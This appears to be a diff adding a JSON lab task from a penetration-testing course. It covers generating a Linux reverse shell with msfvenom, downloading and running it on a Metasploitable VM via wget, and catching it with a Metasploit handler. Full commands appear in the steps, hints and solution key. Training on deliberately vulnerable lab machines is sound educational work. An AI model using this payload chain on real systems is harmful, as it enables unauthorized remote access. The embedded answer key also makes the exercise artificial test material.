@@ -1,0 +1,14 @@
+{
+    "id": "task2",
+    "chapterId": "ch_7",
+    "title": "Generate and Use a Standalone Payload",
+    "description": "Create a Linux reverse shell binary and catch it with a handler.",
+    "estimatedMinutes": 30,
+    "problemStatement": "# Objective\nGenerate a standalone Linux reverse shell payload using msfvenom, transfer it to Metasploitable (simulate a real attack), and catch the connection with a Metasploit handler.\n\n## Steps\n1.  Use `msfvenom` to generate a Linux x64 reverse shell binary:\n    ```bash\n    msfvenom -p linux/x64/shell_reverse_tcp LHOST=[Kali_IP] LPORT=4444 -f elf -o shell.elf\n    ```\n2.  Set up a handler in Metasploit:\n    ```\n    use exploit/multi/handler\n    set PAYLOAD linux/x64/shell_reverse_tcp\n    set LHOST [Kali_IP]\n    set LPORT 4444\n    run -j\n    ```\n3.  **Simulate Transfer**: Since you have access to Metasploitable (from Task 1 or credentials), copy the file via SCP or host a Python HTTP server on Kali and `wget` from Metasploitable.\n4.  On Metasploitable, make the file executable (`chmod +x shell.elf`) and run it (`./shell.elf`).\n5.  Your handler should catch the connection.\n\n## Deliverable\nScreenshot of the handler receiving a connection and the shell prompt.",
+    "hints": [
+        "Use `python3 -m http.server 8000` on Kali to host the file.",
+        "On Metasploitable: `wget http://[Kali_IP]:8000/shell.elf`"
+    ],
+    "expectedOutput": "A reverse shell session opened in Metasploit.",
+    "solutionCode": "# Kali - Generate payload\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f elf -o shell.elf\n\n# Kali - Start HTTP server\npython3 -m http.server 8000\n\n# Metasploitable - Download and run\nwget http://192.168.56.102:8000/shell.elf\nchmod +x shell.elf\n./shell.elf\n\n# Kali - Handler (in msfconsole)\nuse exploit/multi/handler\nset PAYLOAD linux/x64/shell_reverse_tcp\nset LHOST 192.168.56.102\nset LPORT 4444\nexploit -j"
+}
